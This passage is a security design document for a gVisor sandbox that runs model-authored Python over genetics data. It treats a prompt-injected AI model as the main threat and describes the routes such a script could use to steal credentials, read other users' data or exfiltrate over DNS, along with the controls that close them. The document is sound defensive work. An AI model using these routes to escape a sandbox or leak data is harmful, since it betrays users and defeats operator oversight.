# Code execution: threat model and security design

The model authors Python; that Python runs somewhere and reads suite data. This document
decides **where it runs, what it can reach, what credential it carries, and who can invoke
it**, and records the residual risk. Where a decision was a judgement call, the alternative
and its trigger condition are here so a later change is a decision rather than a rediscovery.

**The code is the source of truth for how, and this document for why.** The tables marked
*generated* are rewritten from the code by `scripts/gen-doc-blocks.py`; do not edit them by
hand. Everything else should explain a choice, not restate a value the code already computes —
`sandbox/supervisor.py`, `k8s/deployments/sandbox.yaml` and
`k8s/network-policies/sandbox-policy.yaml` are where the mechanisms live.

**The SDK's public function list is not a containment boundary.** A script that imports the
SDK reaches every method of the `ToolExecutor` the image ships, through
`GeneticsClient._executor` — the underscore is curation, not enforcement — and httpx is
present regardless, since it is the SDK's own transport. A script can call anything the egress
policy permits, whether or not the SDK wraps it. "Absent from the SDK" never means
"unreachable"; section 3 is what makes a target unreachable, with one target it is not written
to cover (link-local 169.254.169.254 — measured unreachable from the pod, but the defence that
carries the weight there is the node pool's `GKE_METADATA` mode and the missing Workload
Identity binding, not the policy).

**What the image contains is a different question from what a script can reach, and only the
first one is settled here.** `genetics_mcp_server/tools/orchestration.py` — the `run_analysis`
gateway, the identity it refuses to dispatch without, and the artifact authorization model —
subclasses the executor rather than being part of it, so it is outside the import closure and
the build deletes it. The reason is the one `prune_venv.py` gives for the whole prune: that
code cannot run in the image (it imports modules the image does not have) and the SDK
does not need it, so shipping its source only hands a prompt-injected script something to
read. It is **not** an access control and must not be cited as one.

**Threat actors, in the order they matter:**

1. **A prompt-injected model.** Tool results and user-supplied attachments enter the model's
   context. A hostile string in a phenotype description, a Europe PMC abstract or an uploaded
   TSV can cause the model to author a malicious script. This is the primary actor: it needs
   no attacker access to the cluster and no compromised account.
2. **An authorized user acting maliciously.** Access is gated by the oauth2-proxy allow-list,
   so this is an insider, not an anonymous attacker.
3. **Anyone who can reach mcp-server.** mcp-server is not behind oauth2-proxy and accepts four
   bearer paths. Its reachability is materially broader than the browser's, which is why
   section 5 exists.

---

## 1. Why in-process execution is unacceptable

The mechanism exists in the codebase and is permanently switched off
(`ENABLE_SCRIPT_EXECUTION=false` in both chat-backend and mcp-server). The reasons are the
requirements list for everything below.

**chat-backend runs as root** with the `chat-data` PVC mounted at `/data`. That PVC holds
`chat_history.db` (every conversation in the deployment, all users) and `llm_config.db`
(user-authored prompt text, fed back into the system prompt). A script running there can read
every other user's conversations and can *write* prompt text that will later be prepended to
somebody else's chat — a persistence primitive, not just a read.

**The environment allow-list is scar tissue.** `sandbox_tools.py`'s `_ALLOWED_ENV_KEYS`
carries its own history: it was a deny-list that missed `INTERNAL_API_SECRET` along with the
internal service URLs. So an earlier version of exactly this feature leaked the suite's
internal service credential into model-authored scripts. The allow-list is the correct fix for
the leak, but it is applied inside the same process, uid, network namespace and mounted PVC as
the credential it is hiding — the script can read `/proc/self/environ` of any sibling, or open
`/data/chat_history.db` directly, and neither control applies. `execute_script` additionally
allows `bash`, and enforces nothing beyond a 30-second `asyncio.wait_for`.

**Decision.** In-process execution stays disabled and is not a rollout toggle for this
feature. Code execution moves to a separate pod, in a separate node pool, with a separate
identity, reached over HTTP from chat-backend only. `sandbox_tools.py`'s `_validate_path`
logic is reused by `read_artifact` — but inside the sandbox pod, against a
`/scratch/<id>/artifacts` allow-list, never against chat-backend's `SUBAGENT_ALLOWED_PATHS`.

---

## 2. Isolation boundary

The **suite baseline** is what the suite's own service containers set:
`allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]`, `RuntimeDefault` seccomp, and
`runAsNonRoot` on several. It is not a cluster-wide property — `docs/project-spec.md` →
Security holds the authoritative per-workload list. The sandbox must exceed it, because it is
the only workload in the cluster that executes attacker-influenceable code by design.

### What the pod declares

<!-- BEGIN GENERATED: pod -->

| field | value |
|---|---|
| runtimeClassName | `gvisor` |
| replicas / strategy | 1 / `Recreate` |
| serviceAccountName | `sandbox` |
| automountServiceAccountToken | `false` |
| enableServiceLinks | `false` |
| dnsPolicy | `None` |
| hostAliases | ${DB_API_CLUSTER_IP} → db-api db-api.genetics db-api.genetics.svc db-api.genetics.svc.cluster.local, ${RESULTS_API_CLUSTER_IP} → results-api results-api.genetics results-api.genetics.svc results-api.genetics.svc.cluster.local |
| uid / gid | runAsUser 65532, runAsGroup 65532, fsGroup 65532, runAsNonRoot `true` |
| readOnlyRootFilesystem | `true` |
| allowPrivilegeEscalation | `false` |
| capabilities | drop ALL, no add |
| seccompProfile | `RuntimeDefault` |
| resources | requests cpu 500m, ephemeral-storage 1Gi, memory 1Gi; limits cpu 1500m, ephemeral-storage 2Gi, memory 3Gi |
| volumes | scratch (emptyDir, sizeLimit 512Mi) |
| probes | readinessProbe |
| command / args | `['/genetics/supervisor.py']` |
| terminationGracePeriodSeconds | 130 |
| tolerations | sandbox.gke.io/runtime=gvisor:NoSchedule |
| nodeSelector | workload=sandbox |

<!-- END GENERATED: pod -->

Four of those need their reason stated, because the value alone does not carry it:

- **The service account is the whole metadata story.** A dedicated KSA `sandbox` with **no
  Workload Identity binding**, on a node pool in `GKE_METADATA` mode with a dedicated node
  service account. Most of the suite uses `serviceAccountName: genetics-suite`, which
  `terraform/iam.tf` binds to a GSA holding BigQuery, GCS and Artifact Registry roles; if the
  sandbox used it, a three-line script hitting the metadata server would obtain those
  credentials directly and every other control here would be decoration.
  `automountServiceAccountToken: false` is **not** part of that guarantee — it defends the
  Kubernetes API server and does nothing against the metadata server, which is reached over
  the network and needs no mounted token.
- **One `emptyDir` and no PVC, ever, and the pod declares no `/tmp`.** `chat-data` is the crown
  jewels (section 1). A temp directory that outlives an execution is a sequential
  cross-conversation channel, because with one replica and concurrency 1 successive users are
  *guaranteed* to share the pod. **Declaring no volume does not remove one**: gVisor supplies
  `/tmp` and `/dev/shm` itself, mode 1777, whatever the pod spec says, and on staging a marker
  written by one execution was read by the next. So the wipe is the design rather than a
  contingency — the supervisor empties both **before every fork** (`wipe_shared_tmpfs`, whose
  docstring carries the edge cases), and the per-execution `TMPDIR`, `HOME` and `MPLCONFIGDIR`
  under `/scratch/<id>` keep its own path out of them in the first place. An entry it cannot
  remove does **not** abort the execution — one undeletable file would otherwise be a permanent
  outage for everyone behind it on a single-replica pod — so the whole of the mitigation is that
  somebody hears about it, and the survivor line goes to **stderr**. That is deliberate rather
  than incidental: everything this pod writes through `logging` lands on stdout, which GKE
  grades `INFO`, and `scripts/monitor/alerter.py` only fetches `severity >= WARNING`, so the
  same line through `LOG.error` would be a record nobody can ever read. The `emptyDir`'s
  `sizeLimit` is the artifact-plus-per-execution-directory budget and **not** a temp budget:
  bytes written outside `/scratch` are the sentry's memory, not the volume's — see "What
  actually bounds the sandbox's storage" below. Mounting bounded `emptyDir`s at those two paths
  was offered and declined: it would make their exhaustion a kubelet eviction like `/scratch`'s,
  at the price of rewriting this invariant from one volume to three.
- **`enableServiceLinks: false`.** Kubernetes otherwise injects `<SERVICE>_SERVICE_HOST`/`_PORT`
  for every Service in the namespace — the whole internal inventory and its ClusterIPs, handed
  to untrusted code for free. Nothing in the egress allow-list becomes reachable through them,
  but the disclosure is gratuitous.
- **`dnsPolicy: None` pointed at loopback.** The resolver must not be a sink, and a *stall* is
  the failure shape to avoid. `ClusterFirst` writes kube-dns into `/etc/resolv.conf` and gets
  exactly that stall against an egress policy that drops 53/UDP; loopback turns it into an
  immediate `ECONNREFUSED`. It is a second line — `/etc/nsswitch.conf` ordering and
  `hostAliases` do the work, and the egress policy is what denies the network.

`strategy: Recreate` and the absence of a `livenessProbe` are availability decisions with a
security edge: a rolling update would put a second sandbox pod on a pool pinned at one node and
break "one execution at a time" from per-pod to per-cluster, and a liveness probe racing a
legitimate long execution restarts the pod and kills the script the wall clock already handles.

**`args:` rather than a `CMD` in the image.** The image's ENTRYPOINT is the bare interpreter
and the manifest supplies the script path. Keeping the default *out of the image* is what keeps
the failure loud: with no `CMD`, a manifest that loses its `args:` starts `python3` with no
script and CrashLoopBackOffs behind a `kubectl apply` that returned 0. `scripts/deploy.sh`
refuses to apply the file unless the container named `sandbox`, in the Deployment named
`sandbox`, declares a non-empty `command:` or `args:` — parsed with PyYAML rather than grepped,
and failing closed on a file it cannot read.

**Deploy-time gates, all of which exist because a `kubectl apply` that returns 0 is not
evidence.** `build-all.sh` exits non-zero when it skipped the sandbox image and the
deployment's tfvars enables the sandbox; `deploy.sh` verifies the image exists in Artifact
Registry before applying (a definite `NOT_FOUND` is fatal, an unanswerable query is a warning —
inability to answer is not evidence of absence); and the apply is skipped entirely unless
`ENABLE_SANDBOX=true`, derived from `sandbox_pool_enabled` in tfvars rather than being a second
switch, and refused outright if no node carries `workload=sandbox`. Those refusals live in a
preflight that runs *before the first apply*, not in the manifest loop where an `exit 1` would
leave every other manifest applied and every rollout unrolled.

**`SANDBOX_URL` on chat-backend has no default and is not optional.** `SANDBOX_ENABLED` says a
sandbox exists; `SANDBOX_URL` says where. The old `http://127.0.0.1:8080` fallback was removed
because on a dev machine that address is db-api — a real, authenticating service that answers
*something* rather than refusing — and in the cluster it is chat-backend's own pod. An unset
value now raises `SandboxNotConfigured` at client construction. The manifest ships the address
unconditionally, even while `SANDBOX_ENABLED` is false, so flipping the flag is the only change
the enabling deploy makes.

### The uid choice: one shared uid, and it is forced

The supervisor and the child both run as uid 65532. The alternative — a distinct child uid —
needs `setuid` before the fork, a `chown` of `/scratch/<id>`, and a `chown` of the token file,
and with `capabilities.drop: ["ALL"]` the container holds no `CAP_SETUID`, `CAP_SETGID` or
`CAP_CHOWN`: `setuid(65533)` and `chown(65533)` were measured returning `EPERM`. Taking it
would mean adding those capabilities back to the one workload that executes
attacker-influenceable code by design.

Three costs follow, and all three are load-bearing elsewhere in this document:

- **`RLIMIT_NPROC` is not a per-execution control.** It is per *real uid* across the pid
  namespace, so a child forking to its limit also stops the supervisor forking — the fork bomb
  takes out the supervisor instead of being contained. The supervisor watches the child's
  process group instead; the kubelet's `pod_pids_limit` is the outer backstop, not a
  substitute.
- **The token file is within the child's same-uid reach.** `/proc/<pid>/environ` is readable by
  any process at the same uid, and mode `0600` on a supervisor-owned file excludes neither the
  child nor any helper it spawns. The mitigation is lifetime, not permissions (section 4).
- **The pre-fork wipe of `/tmp` and `/dev/shm` depends on it.** Both are sticky (mode 1777), so
  only an entry's owner may unlink it. Sharing the uid is what lets `wipe_shared_tmpfs` remove
  what the last execution wrote; a distinct child uid would make that wipe **partial and
  silent**, reopening the cross-execution channel section 2 closes. Anyone implementing a
  distinct uid has to solve this as well as the two above.

The image still *advertises* a second uid (`SANDBOX_CHILD_UID=65533`) in `/etc/passwd`.
Nothing can switch to it, `build-checks.py` keeps the entry consistent with the variable, and
the supervisor must not fork against it.

### gVisor, on its own node pool

`runtimeClassName: gvisor` on a dedicated, pinned one-node pool with a taint only this pod
tolerates. The pool exists for three reasons that a shared pool cannot give: per-pod pid limits
are a **kubelet** setting rather than a pod-spec field; the node service account is
node-scoped, so a sandbox node cannot carry the suite's GSA; and a gVisor escape then reaches a
node whose identity is logging, monitoring and registry-pull rather than BigQuery and GCS.

`GKE_METADATA` mode on the pool is unconditional, which requires the cluster's
`workload_identity_config` to be unconditional too — without it the pool is rejected **at
apply, not at plan**.

### Per-execution and pod-wide bounds

Every number below is read out of `sandbox/supervisor.py`; the reasoning for each is at its
constant. Nothing here is configurable at runtime.

<!-- BEGIN GENERATED: limits -->

| bound | value | enforced by |
|---|---|---|
| wall clock | 60s default, 120s ceiling | `_watchdog`, per execution; over the ceiling is rejected, never clamped |
| kill grace | 2s | SIGTERM to the child's process group, then SIGKILL |
| memory (child) | 2560 MiB | `RLIMIT_AS`, soft and hard, applied by the child to itself; 512 MiB of the pod's 3072 MiB is left as supervisor headroom |
| pid budget | 32 | supervisor-side watch on the child's process group, not `RLIMIT_NPROC` |
| pipe cap | 8 MiB | the reader stops and kills the child's group |
| returned output | 32 KiB head + 32 KiB tail | elision marker between them, additional to the budget |
| artifacts, per execution | 64 MiB / 1024 entries | polled; over it the execution is killed and `_retain` trims back to the quota |
| execution directory | 192 MiB / 20000 entries | the whole of `/scratch/<id>`, artifacts included |
| retained artifacts | 256 MiB | oldest-first eviction across completed executions |
| retained supervisor state | 4 MiB | digest maps and retention rows; the second ceiling eviction fires on |
| /scratch aggregate | 480 MiB | backstop 32 MiB under the emptyDir `sizeLimit` of 512 MiB |
| retention | 300s | a floor, not an instant: the reaper polls every 30s, and the ceilings above can evict earlier |
| artifact read | 512 KiB | plaintext, not the file: a sealed file is allowed 28 bytes more on disk |
| audit stream | 4 KiB/record, 1 MiB/execution, 100 records/s (burst 200) | every one applied on the read end, per execution |
| queue | depth 2, wait 120s | depth counts requests *waiting*; over either, `429` with `Retry-After: 60` |
| request body | 1 MiB | raw bytes on the wire; `code` separately at 256 KiB of UTF-8 |
| request head | 64 KiB | request line and headers as one block |
| read deadlines | head 10s, body 10s, idle 65s | one deadline for the whole head; the idle bound closes silently |
| response body | 1 MiB | a backstop; every component is separately capped |
| SIGTERM drain | 125s | between max wall clock + grace and the manifest's `terminationGracePeriodSeconds` |

<!-- END GENERATED: limits -->

Two of these are worth reading together, because they are the ones that interact badly.
Exceeding an `emptyDir` `sizeLimit` does not fail the write — **the kubelet evicts the pod**,
killing the in-flight script *and* destroying every retained artifact from every earlier
execution in the window. The per-execution quotas plus the retained ceiling are what keep the
aggregate under the cliff, and the aggregate check is a backstop that fires before the kubelet
does. The arithmetic is stated once, in the supervisor, above `ARTIFACT_QUOTA_BYTES`.

What that arithmetic does **not** prove: the reserve is a margin, not a bound. A poll can miss
a few hundred MiB of writes and a child that traps `SIGTERM` keeps writing for the grace
period. What bounds those is how fast the writer is stopped and `_retain` deleting what the
overshoot produced. The steady state is exact; a hostile burst's transient peak is not.

### What actually bounds the sandbox's storage, and how it dies

Three writable paths, two mechanisms — and reading the first one's `statvfs` is how you get the
second one wrong. All of the below was measured against the live staging pod.

**`/scratch` — the `emptyDir`, and its `sizeLimit` binds.** From inside the container it looks
unbounded: gVisor serves it as a **sentry-internal tmpfs**, so the mount is a plain tmpfs rather
than a gofer mount, its root is `0:0` mode 1777, and `statvfs` answers with the sentry's
no-limit sentinel (~8 EiB). **Do not read that as "no limit".** The sentry backs that tmpfs with
a **single filestore file inside the host `emptyDir` directory**, so the kubelet counts every
byte the container writes — 128 MiB written as two files was reported as `usedBytes`
134217728 with `inodesUsed` 2, the directory plus that one file — and the eviction above is
enforced exactly. Deletion releases host bytes as well (the filestore is hole-punched), which is
what makes the supervisor's retention trims reduce kubelet-observed usage and not merely its own
accounting. None of it is charged to `limits.memory`.

Two consequences of that mechanism belong here, because from inside the container each looks
like a defect: the pod's `fsGroup` is **inert** for this volume — the kubelet chowns a host
directory the container never sees, and mode 1777 on the sentry's tmpfs is what a non-root uid
actually writes through — and the container's `/scratch` tree is **invisible on the host**,
where only the filestore file appears.

**`/tmp` and `/dev/shm` — supplied by the runtime, bounded only by the pod's memory limit.**
Neither appears in the pod spec, neither can be taken out of it, and both are mode 1777. Their
`statvfs` advertises a figure derived from the **node's** physical RAM, unrelated to any pod
limit and larger than the whole pod may use, so it never binds. **They are one pool**: filling
either exhausts both, and `statvfs` will not show that — accounting is per mount and blind to
the shared backing, so one mount's advertised free space sits frozen while the other's falls.
What bounds them is the pod's `limits.memory` in the table above and nothing else, which is why
the supervisor wipes them before every fork rather than trying to budget them.

**Past that pool the signature is not `OOMKilled`.** The **host** OOM killer takes the runsc
**sentry**, not a process inside the container's cgroup, so the container reports
`lastState.terminated` with `reason: Error` and `exitCode: 128`, alongside a `SandboxChanged`
event. An operator grepping for `OOMKilled` will not find the incident; `SandboxChanged` and
that exit code are what to search on. Recovery is a fresh sandbox within seconds.

**Whether `/scratch` survives that restart is unknown**, and no doc here should be read as
saying it does. The sentry is recreated, so its filestore file most likely is too, which would
mean retained artifacts do **not** survive a container restart the way a normal `emptyDir`'s
contents would. Both restarts observed during the measurement had a near-empty `/scratch`, so
there was no signal either way. Until someone measures it, treat a restart as losing the
retention window — which is what `read_artifact` already answers for anyway, with a `404`.

### Concurrency, and what it does not remove

One execution at a time, queued beyond that, at one replica. Measured peak is 23 chat turns an
hour, so queueing costs nothing.

**It does not remove cross-user co-tenancy inside the pod.** It bounds what runs at the same
*instant*; the co-tenancy is in the **queue** (other users' requests held in the supervisor
while one executes) and in the **retention window** (completed executions' directories, and the
address space they left behind). Three routes between tenants were demonstrated, and their
status differs:

| route | status |
|---|---|
| supervisor memory — a forked child reading another user's tokens and source out of inherited pages, by module global, frame walk, `gc.get_objects()` and a raw `/proc/self/mem` scan | **closed**, by the fork server: the process that forks has never held a token, a request body or anyone's source code |
| `/scratch` — reading and writing another execution's artifacts at the shared uid | **integrity closed** (the manifest's digests, re-checked on the way out); **reading closed between executions** (retained artifacts are sealed) and **open within one** |
| a `setsid()` descendant that outlives its execution | **bounded across executions** (the fork server is a child subreaper and sweeps by parentage, four chain levels per execution) and **open within one**; unverified under gVisor, which implements `prctl` in the sentry |

The fork server is the load-bearing one, so its property is stated exactly: **the process that
calls `os.fork()` to make an execution child must never have held a token, a request body or
another user's source code.** Nothing reference-shaped can achieve that — Python strings are
immutable and freed objects stay in arenas that copy-on-write hands to the child, so `del`,
`__slots__` and overwriting all fail, which was measured. The only thing that works is never
letting the bytes into the process that forks. It is forked out of the supervisor after
`prewarm()` and before the first byte of the first request body is read; per execution it
receives one control message plus four descriptors and reads none of them.

Two mechanisms make "before the first byte" true, because the HTTP server is already serving
during startup: `_Handler._execute` refuses on `not SUPERVISOR.accepting()` **before**
`_read_body`, so no Python object is built, and `_HeaderBoundedReader` consumes only the
request head, so the body never leaves the kernel receive queue. Both were measured necessary —
with only the first, a body sharing a TCP segment with its headers was recoverable from a child
forked promptly after the 503.

### Rejected controls

| control | why not |
|---|---|
| A custom seccomp profile | `RuntimeDefault` under gVisor already means the sentry, not the host kernel, services the syscall. A bespoke profile is a maintenance surface that breaks scientific Python in ways that surface as an unreproducible script failure. |
| Per-view scoping of the sandbox token | The `scope` claim exists as a hook and only its presence is checked. Narrowing it means db-api learning which views an execution may read, which is a per-request policy store it does not have. |
| Requiring the sandbox token on all results-api routes | auth-gateway's `@api_bearer` location sends real users straight to results-api with no shared secret, so a blanket requirement 401s them. |
| A `PodDisruptionBudget` on the sandbox | Its pool is pinned at one node, so a blocking budget would stall every upgrade and repair of that node. See residual 6. |
| Streaming the `/execute` response | The head-and-tail cap is uncomputable until the stream ends, the manifest and the error object are only knowable at the end, and the model consumes the whole result in one turn regardless. |

### The image

Built from `sandbox/`, multi-stage: a venv assembled in a slim builder, pruned, byte-compiled
and copied into `gcr.io/distroless/python3-debian12:nonroot`. No shell, no package manager, no
`curl` — `execute_script`'s `bash` interpreter is absent from the filesystem rather than
un-allow-listed. The builder must track the base image's CPython **minor** version, because the
final stage runs the distroless interpreter against the venv's site-packages.

The genetics SDK is not vendored: it is pip-installed `--no-deps` from a staged
genetics-mcp-server checkout at build time, so the sandbox and mcp-server cannot drift apart. A
bare `docker build sandbox/` fails without it, by design. `--no-deps` matters on its own —
genetics-mcp-server's dependency set contains `google-auth`, and `google.auth.default()`
resolves `metadata.google.internal` by name where the sandbox has no DNS.

`sandbox/build-checks.py` runs in the builder and asserts the **final** image's properties,
because the final stage has no shell and nothing can be checked after it is assembled: the
absent shell and package manager, `/etc/nsswitch.conf` ordering, the pruned SDK surface, the
advertised uids, the absence of placeholder schema docs, `GCE_METADATA_HOST` pinned to a
literal address, and the house plot style resolving with `text.usetex` off. That last one is the branch a distribution-name check cannot see: polars links
`object_store`, a Rust GCS client that mints metadata tokens with no Python in the path.

One of those checks reads source rather than running it, and the reason is the same one that
makes the prune worth doing at all. `import genetics_mcp_server.sdk` executes module bodies and
nothing else, so an import deferred into a method — the house style for adding capability to
these files — survives every runtime check here and in genetics-mcp-server, and then raises
`ModuleNotFoundError` at call time inside a container with no shell and no package manager.
A `from ddgs import DDGS` shipped that way. So the build also parses every file the image
carries and refuses an import of any top-level name outside the standard library and what pip
actually installed into the venv, at any nesting depth, `if TYPE_CHECKING` included — the file
names the module either way, which is the disclosure the prune exists to prevent. Reading the
resolved install rather than the requirement graph is what makes this answer for the image:
pip has already evaluated the environment markers by then, so nothing has to re-derive which
side of Python 3.11 a conditional requirement falls on.

<!-- BEGIN GENERATED: image -->

The final stage's environment, all of it:

- `GCE_METADATA_HOST=169.254.169.254`
- `GENETICS_MPLCACHE=/genetics/mplcache`
- `GENETICS_PREWARM=/genetics/prewarm.py`
- `GENETICS_SCHEMA_DIR=/genetics/schema`
- `GENETICS_STUBS_DIR=/genetics/sdk`
- `MPLBACKEND=Agg`
- `PYTHONFAULTHANDLER=1`
- `PYTHONPATH=/opt/venv/lib/python3.11/site-packages`
- `PYTHONUNBUFFERED=1`
- `SANDBOX_CHILD_UID=65533`
- `SANDBOX_SHARED_GID=65532`
- `SANDBOX_SUPERVISOR_UID=65532`

`TMPDIR`, `HOME`, `MPLCONFIGDIR`, `XDG_CACHE_HOME` and `PYTHONPYCACHEPREFIX` are deliberately absent: they are per-execution and point inside `/scratch/<id>`, and a fixed path here would be exactly the cross-execution shared directory the redirect exists to prevent. The redirect keeps the supervisor's own path out of the runtime-supplied `/tmp` and `/dev/shm`; it does not remove those, and what keeps them from carrying bytes between tenants is the wipe before every fork (section 2).

`prune_venv.py` reduces the installed distribution to the SDK's import closure, and `build-checks.py` asserts the surviving set is exactly:

- `genetics_mcp_server/__init__.py`
- `genetics_mcp_server/sdk/__init__.py`
- `genetics_mcp_server/sdk/_runner.py`
- `genetics_mcp_server/sdk/client.py`
- `genetics_mcp_server/sdk/errors.py`
- `genetics_mcp_server/sdk/plots.py`
- `genetics_mcp_server/tools/__init__.py`
- `genetics_mcp_server/tools/executor.py`
- `genetics_mcp_server/tools/phewas_categories.py`
- `genetics_mcp_server/tools/sql_safety.py`
- `genetics_mcp_server/tools/uniprot.py`

plus `genetics.py`, the `import genetics` alias. Everything else the wheel installed is deleted — unimportable there for want of fastapi, but a prompt-injected script reads source, it does not import it. `pip`, `setuptools` and the venv's `bin/` go with it: `_distutils_hack`, `pip`, `pkg_resources`, `setuptools`, `wheel`.

<!-- END GENERATED: image -->

`sandbox/schema/` and `sandbox/stubs/` are the model's on-demand description of the data and of
the SDK, generated by `scripts/gen-sandbox-docs.py` from `configs/datasets.yaml` and the SDK
source and verified by `scripts/test-sandbox-docs.py`. They are generated rather than written
for the reason this document's own tables are: a transcribed schema inside a container image is
something nothing would ever notice going stale. Shipping the placeholders degrades silently —
`run_analysis` works, the pod is healthy, and the model reads a file that says it is not the
real documentation — so the build refuses while one is staged.

### The LD proxy: one third-party call the sandbox can cause

A `run_analysis` script cannot reach the internet, and that has not changed. What changed is
that it can now cause **results-api** to make one specific outbound request on its behalf:
`GET /api/v1/ld/{variant}` fronts the FinnGen LD server, because `genetics.ld(...)` resolved
nothing from inside the sandbox and every locuszoom came back uncoloured.

State the delegation plainly rather than treating it as unchanged, because it is a new shape:
a confined caller reaching a third party through an unconfined one. What it is not is a
widening of the sandbox's egress — the NetworkPolicy is untouched, no DNS rule was added, and
`sandbox-policy.yaml`'s "no ipBlock of any kind" still holds. The sandbox talks to
results-api, as it already did for summary statistics.

What bounds the delegation, all in `app/routers/ld.py` and `app/services/ld_service.py`:

- the caller controls **three** values and each is shape-checked before the outbound request:
  the variant (`chr:pos:ref:alt`), the panel (a name), and the window (a bounded integer). The
  destination URL is configuration, never a caller input, so this is not an SSRF surface;
- the outbound request carries **no credential of ours** — the LD server is public — so a
  script cannot use this path to spend an identity it does not hold;
- nothing of the upstream's response body is forwarded on a failure. The caller gets a status
  and this service's own wording;
- the exfiltration question, asked directly: the outbound query carries a variant id, a panel
  name and a window. A script can encode a little in those, at one bounded request per LD call,
  to a third party that logs queries. That is a far narrower channel than the DNS pipe
  `sandbox-policy.yaml` exists to close (~200 KB/s), and it is bounded by the same
  per-execution request and byte counters as every other results-api call, but it is **not
  zero** and should not be described as such.

### Render density, the opt-in style, and the standard plots

Two additions to the image that are about output rather than confinement, recorded here
because both widen what it carries.

`sandbox/gen_mplrc.py` writes the baked `matplotlibrc` and it carries **render density and
nothing else** — `figure.dpi` and `savefig.dpi` at 200. That is a property of the delivery
channel rather than a taste: a figure is handed to the user as a PNG in a chat window, and at
matplotlib's default 100 dpi a default-sized figure arrives too small to read. The supervisor
seeds every `MPLCONFIGDIR` from that directory including its own and imports matplotlib before
the first fork, so every child resolves the same density with no cooperation from the script.

`scienceplots` is the one deliberate opening of `sandbox/requirements.txt`'s closed set, and
the test it was admitted under is that file's own: it ships stylesheets and a registration, no
native code and no import beyond matplotlib, so it does not widen what the image can *do*. It
is **opt-in**: a script that wants it writes `plt.style.use(["science", "no-latex"])`. Imposed
as a default it made some figures worse rather than better — a locuszoom reads by its LD ramp
and its marker shapes, not by journal typography — and a default a caller has to notice and
undo is worse than one they ask for. The `no-latex` half is not optional when it is asked for:
`science.mplstyle` sets `text.usetex: True` and this image has no LaTeX and no shell to run
one, so unpaired it raises at draw time. That pairing is now the script's to write, which is
the price of the style being opt-in.

`prewarm.py` imports `scienceplots` in the supervisor before the first fork, which is now the
*only* route by which it reaches a figure: the import is what registers the style names, so
`plt.style.use("science")` written from memory resolves in a child instead of raising
`OSError`. `build-checks.py` asserts both directions — that the density is in effect, and that
two keys `science.mplstyle` would have changed still hold matplotlib's own defaults, so baking
a style back in fails the build rather than quietly restyling every figure.

`genetics.plots` is a second SDK surface: standard figures — a locuszoom today — as functions
rather than as instructions a script rederives. It is shipped by `prune_venv.py`'s
`SDK_ALLOWLIST` while deliberately staying *outside* the SDK's import closure, resolved through
a module `__getattr__` so chat-backend and mcp-server never import matplotlib. That has one
consequence worth stating: genetics-mcp-server's `tests/test_sdk_import_closure.py` measures
the shipped set by importing the SDK, so it cannot see this file — `SHIPPED_OUTSIDE_CLOSURE`
in that test is the second list that keeps it scanned, and it and `SDK_ALLOWLIST` have to agree
by hand. `sandbox/stubs/plots.pyi` is generated from the module's `__all__` and gated for
equality against it by `scripts/test-sandbox-docs.py`, the same way the data surface is.

These figures do set one thing for themselves, against the no-style rule above: type sizes and
rule widths, fixed in points against the figure width they draw at, because matplotlib's
defaults are sized for a figure twice as wide and a caller who has set no style should not have
to correct for that. It is done on the artists rather than through rcParams, so nothing about
the image's baked density changes and `build-checks.py`'s no-style assertions still hold.

Three choices inside `locuszoom` are worth stating, because from the outside each looks like the
defect it replaced. **LD is asked for above a floor rather than at r²≥0.** The LD server answers
an r²≥0 request with the whole panel, which buries the correlated points in a navy `< 0.2`
cloud and is truncated positionally: measured at `12:49272869:C:T`, a ±250 kb request came back
with 3000 entries stopping 19 kb short of the window's right edge, leaving 97 panel variants
unanswered and that edge of the plot grey with nothing to say why. Above the floor the same
locus returns 17 entries across ±500 kb. Grey therefore means "no r² worth colouring", which is
what it already meant for a variant the panel does not carry. **And LD is asked for over more
than the plotted span**, so a correlated partner just outside the window is named — in the
returned `ld_partners_outside_window` and on the figure — rather than silently omitted. At the
same locus the strongest variant in the region, r²=0.78 with the lead and more significant than
it, sits 42 kb past the default window's edge, and a plot that drops it reads as an isolated
signal. The note fires only above a reporting floor, because what it asks of the reader is a
redraw at a wider window and that is worth doing where the omitted partner would have carried
colour worth acting on, not for every partner the search span reaches. **And the gene track draws one transcript per gene, not all of them.** results-api serves
the exons of each gene's GENCODE Ensembl-canonical transcript, so a locus draws one model per
gene rather than one per transcript — measured at `12:49150000-49650000`, twelve models instead
of the 177 transcripts v49 holds for those same twelve genes, which is legible instead of a
solid band. **The body drawn is that transcript's span, not the gene record's**, and the two are
not close: a GENCODE gene record spans every transcript it has, so on v49 the canonical
transcript covers under a quarter of the record for 641 protein-coding genes and under a tenth
for 185 — TUBA1C's record runs 86 kb against a 9.5 kb MANE transcript. Drawing the record put
four exons in the right-hand tenth of a long bare line, which reads as exons in the wrong place;
this was shipped that way and corrected against a PheWeb reference. A gene the API sent no exons
for keeps the record, because that is all there is to draw it from. **And a gene GENCODE names
only by an ENSG is left out of the track**, rather than drawn under a label nobody can look up.
`n_exons` in the returned dict is 0 when the API served no exon structure at all, which is how a
bodies-only track is told apart from a gene that genuinely has one exon; `n_genes` counts what
was drawn, so it can fall short of the genes in the window.

### The HTTP contract between chat-backend and the supervisor

**This subsection is the interface, because there cannot be a shared module.** The image
pip-installs only the SDK's import closure and `prune_venv.py` deletes the rest, so
chat-backend's client and the supervisor cannot import one definition of the wire shape. Two
implementers building against different assumptions is not recoverable by fixing one side.
**A field not listed here does not exist**, and unknown top-level fields are rejected `400`
rather than ignored.

**It must not depend on Kubernetes.** The same image runs in a plain container for development
and the contract is identical. Nothing in the request or response may carry a downward-API
field, a service account, a ClusterIP or a cluster DNS name, and the client holds exactly one
configuration value — a base URL. What genuinely differs is deployment-only: the runtime class
and node pool, the NetworkPolicy, `hostAliases` versus whatever the dev container resolves, and
`/scratch` as an `emptyDir` versus a container-local directory.

**Transport.** Plain HTTP/1.1 on `0.0.0.0:8080`; bodies are JSON, and the supervisor parses
`Content-Type` as a media type and ignores its parameters. Exactly three routes exist —
`GET /health`, `POST /execute`, `GET /artifact` — any other path is `404` and any other method
on these three is `405`. **There is no HTTP-layer authentication on `/execute`, and that is a
decision.** The pod holds no credential it could verify a caller against, and giving it one
would put a static secret in the single workload that runs attacker-influenceable code by
design. The network is the authentication: the ingress allow-list is load-bearing, and a dev
container must not publish the port. Everything travels in the JSON body and nothing in a
header — headers are what proxies log.

**`GET /health`** answers `{"status", "busy", "queued"}` with `status` one of `ok`, `starting`,
`draining`, `forkserver-down`; `200` for the first and `503` for the rest. `queued` counts
requests *waiting* and does not count the one executing — the same definition the queue bound
uses, so a client cannot end up predicting the wrong `429`. It is the one route exempt from the
